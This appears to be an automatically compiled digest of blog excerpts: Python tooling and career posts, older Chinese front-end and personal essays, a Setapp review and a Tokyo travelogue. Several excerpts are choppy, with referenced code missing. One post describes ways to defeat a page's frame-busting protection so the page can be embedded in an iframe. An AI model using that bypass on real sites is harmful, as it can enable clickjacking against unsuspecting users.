Daily News Digest - 149 articles

## Personal_Blog

**Faster branch coverage measurement**
After nearly two years, I think this is finally ready: coverage.py can use sys.monitoring to more efficiently measure branch coverage.

After nearly two years, I think this is finally ready: coverage.py can use sys.monitoring to more efficiently measure branch coverage.

I would love for people to try it, but it’s a little involved at the moment:

You need to have your own build of Python from the main branch on GitHub, because the CPython side of the work landed after 3.14 alpha 5. Mark Shannon and I have had many back and forths about the behavior of sys.monitoring, finally landing on something that would work for us both.

For the curious: traditionally coverage.py relied on sys.settrace. The new sys.monitoring that arrived in Python 3.12 lets me disable an event once it’s fired, so after the first ping there’s no overhead to running that same code multiple times.

It took a while to iron out the event behavior that lets us measure branches as well as lines, but Python 3.14.0 after alpha 5 has it, so we’re finally able to announce coverage.py support for people to try out.
Source: Ned Batchelder's blog

**Horseless intelligence**
Some thoughts and opinions about AI. Airplanes don’t fly in the same way that birds do. But the anti-AI crowd also seems to be railing against it without a clear understanding of the current capabilities or the useful approaches.

I’m going to be using AI more, and learning where it works well and where it doesn’t.
Source: Ned Batchelder's blog

**Human sorting improved**
When sorting strings, you’d often like the order to make sense to a person. The re.split() function gives us interleaved words and numbers, and try_int() turns the numbers into actual numbers, giving us sortable key lists.

There are two improvements from the original:

The sort is made case-insensitive by using casefold() to lower-case the string.

The key returned is now a two-element tuple: the first element is the list of intermixed strings and integers that gives us the ordering we want. For those, you probably want the full-featured natsort (natural sort) package.
Source: Ned Batchelder's blog

**Nedflix**
Well, Anthropic and I were not a good fit, though as predicted it was an experience. I’ve started a new job on the Python language team at Netflix. It feels like a much better match in a number of ways.
Source: Ned Batchelder's blog

**Find the bear**
Connecting with my six-year-old doesn’t go as planned.

A parenting story from almost 30 years ago.

My wife told me about something her dad did when she was young: in the car, knowing they were approaching an exit on the highway, he’d say to himself, but loud enough for his daughters in the back to hear, “If only I could find exit 10...” The girls would look out the window and soon spot the very sign he needed! “There it is Dad, we found it!” I liked it, it was clever and sweet.

When my son Max was six or so, we were headed into Boston to visit the big FAO Schwarz toy store that used to be on Boylston St. I figured he’d be the perfect target for this.

We got off the T (the subway if you aren’t from Boston), and had to walk a bit. But on a walk a few weeks ago, I happened upon it outside the Tufts Children’s Hospital.

Now I definitely know where it is:
Source: Ned Batchelder's blog

**Regex affordances**
A tour of some real code showing little-used power features of the Python regular expression module.

Python regexes have a number of features that bring new power to text manipulation. In this code, we only ever access groups by name, so I could have left them as regular capturing groups, but I think it’s clearer to indicate up-front that we won’t be using them.

The verbose syntax in particular makes it easier to understand the regex. What we’ve done here is used simple pattern matching paired with useful API features to compactly write a useful transformation.

BTW, if you are interested, the real code is in coverage.py.
Source: Ned Batchelder's blog

**Filtering GitHub actions by changed files**
How to limit what GitHub workflows run based on what files have changed.

Coverage.py has a large test suite that runs in many environments, which can take a while. Using the trusty YAML multi-line string cheat sheet, I tried changing from the literal block style (with a pipe) to the folded style (with a greater-than):

if : >

${{

needs.changed.outputs.run_tests == 'true'

&& !contains(github.ref, '-notests')

}}



The literal form includes all newlines, the folded style turns newlines into spaces. Maybe I’ve saved you some grief.
Source: Ned Batchelder's blog

**PyCon summer camp**
PyCon is exciting, but how do you know which enthusiasms are real and which are just summer crushes?

I’m headed to PyCon today, and I’m reminded about how it feels like summer camp, in mostly good ways, but also in a tricky way.

You take some time off from your “real” life, you go somewhere else, you hang out with old friends and meet some new friends. The excitement of the summer is overtaken by your autumnal real life again.

PyCon can be the same way, either with people or projects. Will I become attached to yet more things this time? Is that bad? Should I temper my enthusiasm, or is it fine to light a few fires and accept that some will peter out?
Source: Ned Batchelder's blog

**Digital Equipment Corporation no more**
Tech giants come and go

Today is the 39-year anniversary of my first day working for Digital Equipment Corporation. I can mention my job to anyone and they are impressed in some way. In 39 years when they tell a story from the early days of their career will they start with, “Have you heard of Netflix?” and have to adjust to the blank stares they get in return?

This too shall pass.
Source: Ned Batchelder's blog

**Math factoid of the day: 63**
Two geometric facts about 63, but how to connect them?

63 is a centered octahedral number. It seems like there should be a way to convert Haüy coordinates to Delannoy coordinates to show how they relate. I don’t have the focus time to learn how to write the program, so I can leave it to an imperfect assistant.
Source: Ned Batchelder's blog

**我已经离不开了一个名叫博客的东西**
本文摘自 勾三股四 更早时期的 不老歌 博客。

找了好久，精挑细选，我选择了在不老歌开始新的网志生活。



前阵子被人说自己是火星人，只用QQ聊天，只懂得专研代码，就知道踢球；不爱看小说，不爱看电影，不会做饭，不爱逛街，也不怎么用电话。总之一点都不像正常人



我想了想，好像勉强属实。但又一想，以前的自己似乎不完全是这样的——最起码，从前的我，还总跟人讲电话发短信，人缘不错也爱凑热闹，每个礼拜都给家里的老爸老妈通电话问寒暖报平安的。



或许以前的自己真的太累了，想休息了。我逐渐喜欢比较清静的环境，喜欢一个人在夜深人静的时候默默思考，写点东西。

当世界的纷乱在我们的眼中还可以用缤纷来形容时，一切都是那么会让人蠢蠢欲动。



在校内网崩坏的那一刻，

在之前的烂摊子逐渐冷却的那一刻，

在脚踝在篮球场上扭伤的那一刻，

在夜深人静诚实分析自己的那一刻，我突然觉得这里好惬意。



你们也喜欢这里吗？
Source: 囧克斯

**令人荡气回肠的切尔西·斯坦福桥**
本文摘自 勾三股四 更早时期的不老歌博客。刚刚看过今晨的欧冠录像，切尔西和利物浦战成4比4，红军的激情和蓝军的顽强都在这里展现的淋漓尽致！通过摄像机的镜头，我又看到了熟悉的斯坦福桥球场，想起了4年前切尔西和巴塞罗那在这里的一番激战。当时的比分是4比2，切尔西和巴塞罗那这两支当时欧洲最优秀的队伍，为了一个欧冠8强席位都拼得你死我活，出线权也随着双方一个接一个的进球4度易主，也缔造了罗纳尔迪尼奥那一脚惊世骇俗的年度最佳进球。那个时候的我，还是个大学生，大学的时候宿舍没有电视，又想看球，就约了几个球友晚上出去租一间带电视的小破屋子一起看，斯坦福桥的那场比赛是我学生时代看得最过瘾的一场，而且印象如此深刻。今天再次看到斯坦福桥的又一场经典战役诞生，不得不感叹切尔西金元的能量和职业足球的魅力！也希望自己在未来的某一天可以有机会亲身经历这一切。以此为我的博客新分类“今天的业余爱好也许就是明天的职业”作序。
Source: 囧克斯

**推荐一个 Javascript 监听输入框改动事件的实现方案**
本文摘自 勾三股四 更早时期的 不老歌 博客。

if (window.addEventListener) { domInput.addEventListener('input', handler, false); } else { domInput.onpropertychange = handler; }

如题，以上方案，可以兼容目前的在所有主流操作系统上，所有主流浏览器里，用所有主流输入法输入文本(包括粘贴)的事件。我们一般监听输入框改动的方案是通过 onkeyup/onkeypress，其属于 web 标准方法，兼容各浏览器，但局限性在于跟一些特定输入法和特定操作系统之间的结合并不完美。比如在 ubuntu 下切换到中文输入法，就触发不了 onkeyup/onkeypress 了，直到关闭输入法，才会触发相关事件。如果大家有更好的解决方案，欢迎在此交流。
Source: 囧克斯

**有一种动弹不得的感觉**
本文摘自 勾三股四 更早时期的 不老歌 博客。

这个世界好小，以至于我们在任何时候、任何场合、做任何事情，都要顾及“所有的人”——哪怕不是我们当时所处圈子里的人。



我们每个人都有自己各式各样的圈子。圈子与圈子之间相对独立，如果工作圈里遇到了困惑，可以找生活圈的人来分担，如果在生活圈里找到了快乐，也可以在学生圈里跟大家分享；可这又是藕断丝连的，因为各自圈子里的人也是可以通过其它途径相互认识和熟悉的。尤其是困惑这种东西，通常我们都不想将其公开，尽量低调解决——甚至是更为私密的内容，这时我们往往希望可以有一个相对可信、封闭、保密的圈子来帮助你。



但，这些我们平时觉得值得信赖的“圈”，真的就是可信？封闭？保密的么？

我逐渐觉得，在当今信息化的社会，这样的“圈”似乎是不存在的

我总觉得自己是一个存不住话的人，有什么想法，都一定要说出来才痛快，只是我可以选择说给谁听罢了。



或许，我将来也应该学会，在必要的时候，把想法默默吞下去。



有一种动弹不得的感觉……
Source: 囧克斯

**失去信仰是一件很可怕的事情**
本文摘自 勾三股四 更早时期的 不老歌 博客。

总而言之，言而总之，我们总是把信仰认为是最可靠、最值得信赖的东西，当有一天，我们发现连自己的信仰都不靠谱的时候，那种失去信仰的感觉，是很可怕的。



如今，人们的信仰多种多样，千姿百态，有宗教信仰，有文化信仰，还有一种信仰我个人将其称作“崇拜信仰”，即把自己崇拜的事物(如老爸、明星、球队或产品等等)奉为信仰。只要是老爸的话，就一定要听；只要是偶像做的事情，就会去模仿和谈论；只要是苹果出品的东西，就会买来用或大加赞赏；只要是中国队的比赛，就一定会赢(这个有点夸张了)。我们有想象过那个自己心中的“偶像”、“苹果”或是“中国队”被人扒得一干二净，最后发现其本质是如此猥琐时的感觉么——那种诺大世界中找不到可以信赖的东西的无助感觉……



记得曾听我一个朋友评价电影《阿甘正传》轰动一时的原因和意义。其中就提到了当时的美国社会和那一代美国人多处于丧失信仰、自我迷失的阶段，这时需要一种正面力量的刺激，让大家重新找到各自的信仰，也需要“造神”，通过个人英雄主义来带动周围的人。



我觉得“造神”这个词用在这里很准确，这个世界上没有常胜将军，人总是不完美的，但越接近神的人，越能够给周围的人正面的影响。有时觉得那些“造”出来的神很无聊，甚至很鄙视他们，不过我逐渐感受到了大家在“造神”其中的良苦用心和其深远意义。



也希望这些“无限接近神的人”，应该了解和清楚，自己的一言一行，背负着什么样的社会责任。



所以，

尤文图斯的庸者一定经历了一段失去信仰的过程，

黄健翔的忠实听众一定也反问过自己是不是神志不清了，

五月天的迷妹们也肯定在贴吧喷完口水后悄悄地问自己每天在听的音乐到底算不算真摇滚……



再所以，

科比比姚明更接近神，

湖人队也是一定会晋级的，

巴萨的球迷此时此刻一定是迷失自我的，

我对我身边的大神，也真的很失望……
Source: 囧克斯

**PHP+MySQL 学习心得**
本文摘自 勾三股四 更早时期的 不老歌 博客。

最近在看一本跟 PHP/MySQL 相关的书籍，使我更深入的了解和认识了这些技术。这里会不定期更新一些自己的学习心得。以备将来复习用，同时也分享给大家：



1. 形如 mysql_xxxx 的很多函数都有一个可选参数，即代表某个数据库连接的变量，这个参数通常在我们见到的 PHP 程序例子中都被省略了，当这个参数被省略时，执行该函数的数据库连接即为最近一次建立的数据库连接。

3. 多选的 select 控件在提交表单时，可以将其 name 设置为数组名，如：



《select multiple name="province[]"》...《/select》

这样选中的项会存到名为 $_GET["province"] 或 $POST["province"] 的数组当中，如果把其 name 值设为 province 而不是 province[]，则提交表单后只会解析出最后一个选中的项的值。
Source: 囧克斯

**夏天来了**
本文摘自 勾三股四 更早时期的 不老歌 博客。

这个礼拜应该算是北京夏天真正到来的一刻。

上周下雨，很凉快，之前也没有热得很离谱。最近几天嘛，哎呦~不一样了~

四季都有分明的特点，有人喜欢夏天，有人喜欢冬天，有人喜欢春秋，有人喜欢战国。。。

我暂时抱着一种抗拒的心理来迎接夏天，因为很热，连晚上都是，整夜整夜睡不好觉，吃饭也吃得不香，蚊子也很多，每天晚上都被咬很多口，第二天浑身痒痒，生不如死。

昨天有人跟我说还蛮喜欢夏天的。

你们真的喜欢夏天么？反正我看不出夏天哪点好。。。
Source: 囧克斯

**其实我不懂 Javascript**
本文摘自 勾三股四 更早时期的 不老歌 博客。

最近在读一本有关 javascript 的书。

这本书很有趣，虽然内容是枯燥的，但偏偏又是我感兴趣的——我总是看着它不知不觉的犯困，每次睡醒之后，又立刻想把它继续看下去。

它虽然是讲 javascript，可基本不讲浏览器环境，统统是在推敲和雕琢语言本身的细致入微的环节。透过这本书，我看到了很多 js 被 ie/ff/chrome/op 以及 web 设计师、架构师们打磨过后，被埋没的内容——而这些内容又是这么让人豁然开朗。我才发现，原来自己之前对这门语言的了解，是很片面的。同时，这本书还打破了我的一些迷信思想：



1. eval 语句中应该是一个完整的语句，而非表达式，此函数共执行三件事：解析语句 - 执行语句 - 返回语句的返回值；. 可以通过 in 语法判断对象是否具有某个属性：这本书还没看完，应该还有很多可以拿来完善我们的 js 知识体系的内容。这里做一个阶段性的自我整理。同时分享出来。
Source: 囧克斯

**防止页面被 iframe 内脚本“打散”的两种方法**
本文摘自 勾三股四 更早时期的 不老歌 博客。

页面被 iframe 内脚本“打散”的情况越来越常见。比如，在百度的搜索结果页面中有这样的脚本：

if (top.location != self.location) { top.location=self.location; }

if(document.all){ var isIE = true; var location = ""; var domain = document.domain; }

window.onbeforeunload = function(evt) { return '(请用户选择留在此页面的提示)'; };

这时，如果我们把这个页面作为 iframe 放到另一个页面里，则外层页面会被直接跳转至搜索页面。这个代码对页面本身做了保护——即不会被其它页面引用，也给我们在需要引用这些页面时带来了一些困扰。下面介绍两种解决方法：1. 通过掩盖 location 和 domain 变量，像下面的代码那样：再对 top.location 赋值就不会将页面“打散”了。不过这个方法仅仅对 IE 浏览器管用，且会提示脚本错误。2. 通过 onbeforeunload 事件监听，中断“打散”的动作。即：这样，在页面跳转之前，会弹出一个确认对话框提示用户要不要继续执行页面跳转(即“打散”)的操作。如果用户选择了“否”，则页面会终止跳转操作， iframe 里的脚本也就不会“打散”整个页面。这个方法也有弱点，就是它总是弹出确认对话框，有的时候这会让人很受不了。介绍完毕，两种方法各有优劣，可视状况采用不同的方法。
Source: 囧克斯

**穿墙看 YouTube 也是一种 Rock'N Roll 的 Style！**
本文摘自 勾三股四 更早时期的 不老歌 博客。

Yeah!



大家好我是卢广仲!

Yeah!



我爱看 YouTube !

Yeah!



我现在终于知道怎么穿墙看 YouTube 了!

Yeah!



绑 hosts

Yeah!



C:\WINDOWS\system32\drivers\etc\hosts

203.208.39.104 www.youtube.com

就可以啦!

Yeah!



最后记得每天吃早餐!

Yeah!
Source: 囧克斯

**介绍我自己**
本文摘自 勾三股四 更早时期的 不老歌 博客。

勾三股四





本名赵锦江

英文名Jinks



Blog: http://bulaoge.net/?g3g4

QQ: 110 698 041

Email: zhaojinjiang爱他yahoo刀com刀cn (万恶的网络爬虫 - -)



SlideShare: http://slideshare.net/jinjiang/

GitHub: http://github.com/jinjiang/





酷爱编程

喜欢足球、音乐



目前在傲游(Maxthon)上班

写代码是我的专业

前端开发是我的老本行



崇尚简单生活而不失激情

信科学 信W3C





大概的人生规划是：



20岁~30岁写代码

30岁~40岁玩音乐

40岁~50岁当足球教练

听说程序员的平均寿命是47.5岁……

如果我还能活到50岁，就给自己写一篇个人自传——只写给我自己

如果我还能活到60岁，就把50岁写的书出版



总之我就是这么爱幻想……





我已回到现在





另外，每个Blog都是有过去的……





2010-08-21 更新——调戏凡客：


Source: 囧克斯

**关于 html dom table 的相关操作**
本文摘自 勾三股四 更早时期的 不老歌 博客。

[HTML DOM Table].cells[]

[HTML DOM Table].rows[]

[HTML DOM Table].insertRow(index)

[HTML DOM Table].deleteRow(index)



[HTML DOM TableRow].cells[]

[HTML DOM TableRow].rowIndex

[HTML DOM TableRow].insertCell(index)

[HTML DOM TableRow].deleteCell(index)



[HTML DOM TableCell].cellIndex

-----------------------------------

在部分“现代浏览器”中，table 的 innerHTML 是会引起错误的，而且再加上 tbody/thead/tfoot 这种幽灵般的标签的存在，个人认为上述的方法和属性无疑是控制 table 内容的更好选择。



最后是一则本人的最近引起小骚动的签名档：

一个厕所三个坑——W3C
Source: 囧克斯

**php 中的 json**
本文摘自 勾三股四 更早时期的 不老歌 博客。

用惯了 javascript 中的 json，格式很简单，很灵活。发现 php 中也有这个东西可以用。





通过 json_encode(obj) 和 json_decode(str, [bool=false]) 可以在 php 中实现 json code 与 json object/array 之间的转换。





比如：

var_dump(json_decode('{"title": "Blog", "catogery": "php"}'));

会输出下列内容：

object(stdClass)#1 (2) { ["title"]=> string(4) "Blog" ["catogery"]=> string(3) "php" }

而第二个参数设为 true 后：

var_dump(json_decode('{"title": "Blog", "catogery": "php"}', true));

会输出下列内容：

array(2) { ["title"]=> string(4) "Blog" ["catogery"]=> string(3) "php" }

最后有一点需要注意的是，json code 中的 key 必需要求使用双引号标注起来，而 javascript 中没有这个硬性要求，只要是符合变量名规则的 key 都不需要加双引号。
Source: 囧克斯

**我订阅了 7 年的服务:常用的 Setapp 软件推荐**
今天来分享一个我已经订阅了 7 年的 Mac 软件服务: Setapp，上一次介绍 Setapp 已经是 2018 年的 1 月。Setapp 体验:每个月 $9.9 订阅 Mac 软件过去几年，我几乎所有的软件和服务都已经正版化。在过去几年的云账单中，也有介绍我订阅的一些软件和服务，大家如果感兴趣，也可以看看我过去的云账单:我的云账单:2023 年我的云账单:2022年我的云账单:2017篇2015年:你有几张「云」账单？Setapp 是什么？​从 2012 年开始，我就使用 Mac 作为自己的主力机器，平时工作、娱乐大多也是在 macOS。Mac 平台上有不少优秀的应用和服务，有些是买断制，有些是订阅制。Setapp 是一个包括了 240 多款应用的订阅服务，只要你订阅了 Setapp ，就可以使用其中的应用，不用再额外购买了。这是当前 Setapp 中评价最高的一些应用，还是有许多熟悉的面孔。范围涉及效率、开发、设计、工具等等，基本覆盖了大多数人的需求。2020 年后，Setapp 也开始支持 iOS 应用了，如果在 iOS 上也有对应的 App，可以 1 Mac + 1 iOS 同时享受订阅服务。套餐和价格​目前 Setapp 提供了个人、团队和家庭三种套餐方案，除此之外，也提供了教育优惠，具体的大家可以自己去官网比较。目前 Setapp 针对新用户，提供免费试用，目前官方默认提供的是 7 天的免费试用，如果使用下面我的邀请链接，则可以获得 30 天的免费试用。Setapp:免费试用 30 天Setapp:LUOLEIORG 专属优惠首先说结论，如果想要最划算的套餐，建议找人拼团，一起使用家庭套餐，$19.99 美元 4 个人，年付是$215.88,算下来每人约¥388/年，如果是叠加教育优惠 50% 折扣，则差不多¥200/年。有关订阅和价格的资料，可以参考下面的几篇文章:Setapp 更新了付费机制，怎么订阅更划算？用 300 元订阅总价超过 4000 元的 App，这可能是最划算的 iOS 订阅服务我现在使用的套餐​由于我很早就开始使用 Setapp，目前依旧是老的家庭套餐，$14.99 ,支持 1 主账号 + 5家庭成员共 6 人，年付$161.892,每人约¥190/年，目前偶尔还有一些老车有空位，可以留意下 V2EX 之类的论坛。优点​省心:常用的一些 App 都有了，不用再额外给钱订阅中包含的 App 会逐步增加(但是速度不快)缺点​如果之前已经买断过里面的 App，就不划算了。随着年限的增加，如果更新的 App 不够，性价比会随着时间推移降低。App 里实用的也就几十个，大多还是用不上。我常用的 App​软件类型原价推荐指数Spark Mail邮件客户端$7.99/月⭐⭐⭐⭐⭐Paste剪贴板管理$20/买断⭐⭐⭐⭐⭐iStat Menus系统监控$11.99/年⭐⭐⭐⭐⭐Sip取色工具$24.99/年⭐⭐⭐⭐⭐Mosaic窗口管理£14.99/买断⭐⭐⭐⭐⭐CleanShot X截屏工具$29/买断⭐⭐⭐⭐⭐CleanMyMac X软件管理$34.95/买断⭐⭐⭐⭐Timing时间记录$9/月⭐⭐⭐⭐TablePlus数据库管理$89/买断⭐⭐⭐⭐CloudMounter云盘管理$29.99/年⭐⭐⭐⭐Downie视频下载$19.99/买断⭐⭐⭐MindNode思维导图$24.99/年⭐⭐⭐Spark Mail​Spark Mail是我日常使用的邮件客户端，支持 iOS、Android、Mac、Windows，也支持多端同步，去年开始集成 AI 功能，几年前调研了一圈邮箱客户端，最终还是选择了 Spark。Paste​Paste是一款剪贴管理软件，支持复制、粘贴、同步文本、图像等等，对于日常需要经常复制代码、文字的我来说，极大提高了效率。iStat Menus​iStat Menus可以在菜单栏显示 CPU、内存、硬盘、网络等系统信息，有时候需要观察CPU、内存和网络情况，直接在 iStat Menus 上就能看到，就不用进去 Activity Monitor 了。Sip​Sip也是 macOS 上经典的取色工具了，对于程序员、设计师来说都十分实用，可以快速取色，支持多种格式，也能把常用色保存到自己的调色板中。Mosaic​Mosaic是一款窗口管理软件，支持快捷键调整窗口大小、位置，我经常用来快速切换桌面的窗口布局。设置了上下、左右几个常用布局的快捷键。CleanShot X​CleanShot X也是我高频使用的截屏软件，经常使用 CleanShot X 来进行窗口截图，里面的标注、马赛克、自定义窗口背景很实用，拿来进行初步的图片处理后，就可以直接发布了。CleanMyMac X​CleanMyMac X也是 macOS 上经典的软件管理工具，平时用来清理垃圾文件、卸载软件、优化系统，也是我常用的软件之一。Timing​Timing是 macOS 上一款时间追踪管理软件，可以自动记录你在电脑上工作的时间，使用的软件和频率和时长。可以用于评估自己真实的工作效率。TablePlus​TablePlus是一款数据库管理工具，支持 MySQL、Redis、MongoDB 等主流数据库，TablePlus 算是比较轻量和好用的，满足了我的日常开发需求。CloudMounter​CloudMounter是一款云盘管理工具，支持 Google Drive、Dropbox、OneDrive、Amazon S3、Cloudflare R2 等，也支持 WebDAV。CloudMounter 可以将云盘以目录的形式挂载到本地，方便直接在 Finder 中操作和管理文件，使用起来比较方便。Downie​Downie是一款视频下载工具，支持 YouTube、Twitter、哔哩哔哩等主流视频网站。有时候看到视频想保存下来，Downie 就是一个不错的选择。MindNode​MindNode是一款思维导图软件，有时候我写文章和拍视频之前，会先用 MindNode 来整理思路。其他应用​除了上面的常用应用，我也在使用 Setapp 提供的一些其他应用，鉴于篇幅就不再单独介绍:Bartender: 老牌菜单栏管理工具，说句题外话，我觉得 macOS 的菜单栏设计真的很烂，逼着第三方软件来解决。Lungo: 防止 Mac 进入睡眠模式Squash: 图片压缩和批量处理工具Proxyman: 代理和抓包工具Gemini: 查找和删除重复文件Archiver: 压缩和解压缩工具Renamer: 文件重命名工具Wifi Explorer: Mac 下的 WiFi 网络扫描和分析工具Disk Drill: 数据和文件恢复工具AIDente Pro: Mac 电源管理和优化工具总结​我从 2017 年开始使用Setapp，尽管通过家庭套餐降低了月租费用，但这几年累计的花销仍然不小。近年来，越来越多的 App 转向订阅制。在这种趋势下，即使排除提供一次性购买的 App，Setapp 相比之下还是更划算且省心。如果你家里有多台 Mac 设备，或者有多个家庭成员都在使用 Mac，还是推荐可以搞一个 Setapp。
Source: 罗磊的独立博客

**日本旅行 2024: 东京晨跑・镰仓**
五月的时候，同老婆又去了一趟日本，过去这几个月，诸多事务，也是在今天这个时间，终于有时间写完这篇游记。2016 日本: 东京・仙台・松岛・白石距离上一次去日本，已经过去 7 年，2016年，我和老婆第一次去日本，逛了逛东京和仙台；2017年的元旦，与老婆在大阪又跨了一个年。从中扣除那如同时间按下了暂停键般的疫情 3 年，我的心理时钟似乎也只感受到了 4 年的流逝。自从 2021 年我重新上班之后，我和老婆已经很久没出远门旅行了。这次去日本，目的地很明确，行程上也没有什么其他安排，纯粹就是给自己和老婆，安排一场放松的旅途。与我们以往那些充满了奔波劳顿的出行不同，这次我们只安排了五天四晚的东京行程，五天只去了东京和镰仓两地。行程​日期行程DAY1深圳・东京成田机场DAY2皇宫晨跑・上野公园・东京国立博物馆・国立西洋美术馆・浅草寺DAY3东京车站・镰仓高校前・江之岛DAY4东京大学晨跑・明治神宫・代代木公园・涩谷DAY5东京铁塔・麻布台之丘・深圳在日本的四晚，我们都选了东京的同一家酒店，也是 2016 年我们在东京住过的酒店，也算是重温一下当年的回忆。DAY1: 深圳・东京成田机场​很久没来深圳机场了，这次从深圳直飞东京，深圳航空，票价倒尚好，两人来回 4K 多。这次我们的行李很少，只带了两个登机箱，一个背包。航班出发时间是中午，时间不赶。这次的航程图，到了后程靠着日本海岸线飞行，倒也可以在空中看到不少沿岸风景。到底东京接近下午 5 点，又一次看到东京的海岸线。在飞机上看到一座小铁塔。伴随这落日，落地东京成田机场。廊桥前往海关的路上，见到看似熟悉的欢迎标识。这一次入关很快，全程电子登记，也不用排队，在机场看到不少东南亚裔工作人员，看来这些年日本的外劳政策效果还是挺明显的。过了海关，坐快线前往市区，从成田到市区有很多交通方式，指引也很清晰。换乘之后，终于到达预定的酒店，这也是我们第二次入住，酒店名叫「东京庭之酒店」，位于水道桥站站附近，离东京巨蛋和东京大学很近。房间不大，但是设施齐全，酒店内的环境也不错。HOTEL NIWA TOKYO 庭のホテルDAY2: 皇宫晨跑​第二天我很早就起床了，开启这次东京之行的独享时光。这次来东京，我专门带了跑鞋和运动衣物，就是打算在东京跑跑步。5月早上的温度很合适，不热不冷，今天的天气也很好。今天准备去皇宫跑一圈，从酒店慢跑过去，只有几公里，路上穿过早上的居民区。到达皇居外围的竹桥。从这里开始一路，就可以沿着皇居绕圈了，这也是许多跑步爱好者的经典线路。皇居外围有护城河，也有专门的步道，一路遇到不少跑者。一路慢慢悠悠，三公里不到，即将进去皇居。到达皇居外苑，铺满细沙这里行人比较多，道路窄，如果要进去就禁止跑步了。人很少，加上天气不错，这次过来跑步，也是很舒服。环绕皇居只需 5 公里左右，对于我这种跑马拉松的人来说，连热身都不算，所以后面我就慢慢走了。皇居有不少门，有警察把守。早8点，轻轻松松跑完一圈，完成一环，解锁村上春树同款跑步线路。接下来慢慢悠悠走回酒店，路上上班的人也变多起来。DAY2: 国立博物馆・西洋美术馆​在东京的第二天，第一个白天的行程，只安排了博物馆。先来上野公园，先去东京国立博物馆，公园有好几个博物馆。 路过国立科学博物馆。国立科学博物馆看着也有些年头，门口有一个好大的蓝鲸雕塑。穿过公园，来到北面的国立博物馆。门口的小亭子买票，成人 1000日元/人，约合人民币 50 元。国立博物馆有几栋建筑，首先去本馆参观。本馆建立于 1938 年，属于西洋风格，进入本馆后有楼梯直通二楼。今天也有不少学生在这里参观。同大多数博物馆一样，基本也是按照时间线，分不同小区展示，中日文化一脉相承，日本的古代文化基本就是中国文化的传承和演绎，在国内我东西南北也看了不少国家级博物馆，对于日本博物馆的藏品，倒也没有什么感觉特别惊艳的地方。但是既然来了，还是慢慢悠悠逛了两个小时。即将离开本馆，在墙上看到一排海报，之前有段时间，有学习和了解过一些设计和排版相关的知识，日本的设计美学排版，可以说也是影响了不少人。实事求是的说，虽说这些年国内的设计水平逐步上升，但是在美学和设计上，中日的差距还是显而易见的，尤其是日常生活的一些诸如字体、招牌、标语、海报的设计。审美这玩意，尤其是我们普通民众对审美的认知，如同「素质」一样，非一日之功，都是需要几代人的基本教育和传承，才能养成的。逛完本馆，又去了东洋馆，东洋馆主要展示亚洲各国的文物，当然其中重头部分也是我们中国的流失文物。一入馆，首先看到的就是我们的佛像。菩萨立像・ 北齐时代・天保3年(552）・山西长子县观音菩萨立像・隋代・开皇5年(585)・河北省崇光寺除了中国的展品，也有来自印度、伊朗、东南亚等国的文物，最近黑神话悟空大火，里面不少场景取景中国传统佛道场景，当时我在博物馆东亚馆里看到这些佛像的时候，心中除了「遗憾」，也感受到了这种人类文明和文化共通的魅力。幽暗的展厅，配合打光，这些佛像的面貌，承载着历史，也传递着人类文明中对于信仰、精神和美的追求。经历千年战火，依旧给站前面前的参观者，带来一种安静和庄严。中午时分，参观完两个馆，也准备出去吃饭了。5 月虽然已经过了樱花季，但是天气还是舒服。馆外的座椅上，有游客在晒着太阳休息。国立博物馆北侧有一个庭园，有日式传统的建筑，不大，推荐也可以绕着走一圈即可。庭园植被茂密，现在即将入夏，一片翠绿，如果是秋冬过来，应该会是另外一番景象。生活在南方久了，尤其是广东基本没有四季之分，有时候跟老婆倒想去北方体验一下四季变化。逛完国立博物馆，已经是中午时分，准备出去吃饭。上野公园东侧有一条商业街，有不少餐馆，可能已经过了饭点，街上人并不是太多。走到台东的一条步行街，里面很多商铺。我们在里面吃了一家拉面，味道还不错，服务的阿姨也很热情，看到我们是外国人，还特意用翻译软件跟我们确认拉面的配料。这也是在日本大多时候体验很舒服的地方，来日本三次，也去了几个城市，整体的感受都很舒服。吃完饭，继续下午的行程，上野站附近多旅游景点，人还挺多的。继续参观国立西洋美术馆，美术馆也是位于上野公园内，在上野动物园对面，勒·柯布西耶设计，建于 1959 年，专门收藏西洋美术作品。美术馆不大，收藏了不少名家作品，对于我们一般民众而言，可能也就看看莫纳之类的名家作品。如果对艺术不太感兴趣，可能会觉得有点乏味，我和老婆独自在馆内各逛各的，倒也逛了一个多小时。毕加索的作品「男人和女人」。2019 跨年去了一趟纽约，在 MOMA 现代艺术博物馆和大都会博物馆，也看到了许多名家作品。纽约 | 2019，我在时代广场跨年 | NYC深度行摄这次在东京，再次见到这些名家作品，也是感受下艺术跨越国界的魅力。逛完美术馆，时间尚早，准备再去浅草寺逛逛。东京轨道系统世界文明，在地铁站内看到一条之前的铁轨。浅草寺应该属于那种名片性质的旅游景点，商业化成熟，对于我来说，就是一个打卡的性质。人很多，国际游客应该都会来这逛逛。对于拥有北京、西安一众古城的中国游客来说，应该对这个寺庙不会有太多感觉。民俗项目观音签，老婆也去抽了一张，是个吉签。在浅草寺呆了一小会，看时间也不早了，今天走了一天也挺累，准备回酒店休息了。在路中央看到一个贴满贴纸的路牌。DAY3: 镰仓​东京的第三天，今天去镰仓。去镰仓要在东京站转车，上次来东京的时候，也是在这个地方，给老婆拍了一张照片。2016 和 2024 年，同一个地方，8 年时光。今天也是一个好天气，老婆也很开心。坐了近一个小时的JR，到达镰仓，出了镰仓站，接下来就是换乘电车，去海边。买了一张一日通票，有这张票就可以在一天的时间内任意次数乘坐电车，肯定划算。出现在无数人游记中的电车，这也是来镰仓必须体验的交通工具。来到海边，我和老婆决定开始漫步一段。今天天气真棒，风也很大。海边的小屋，有点欧式风格。看着十分干净。走了没几步，我和老婆都不由惊喜，远远地就望到了海那边的富士山，这也是我两第一次见到富士山。这次旅行，轻装上阵，只带了索尼 A7 搭配腾龙2870的变焦头，远远拍一张富士山，镰仓海边多云雾，我们也算是运气好，能看到这么清晰的富士山。唯一有点遗憾的是，今天风太大了，吹得老婆的头发乱漂，不好拍照。过马路的游客，就像漫画一样。海边的路牌。海滩上也有不少的游客，海浪挺大。第一次见到马自达这个车。除了自驾，海边也有不少人骑摩托和自行车，说到这还是挺羡慕的，国内禁摩的地方太多了。来到著名的镰仓高校前车站，也是很多游客必去的地方。等到电车靠近，给老婆抓拍一张。海边的7-11，应该也是一个著名的打卡点。见到 MX-5，在这种天气、这种地方开，真爽。路过一个路口，刚好看到骑行的人和路人同框，抓拍一张。临近中午，肚子也饿了，找了一家路边的餐厅，吃饭。我和老婆点了两份主食、薯条、炸鸡，配上两杯饮料，算下来224人民币，价格还算 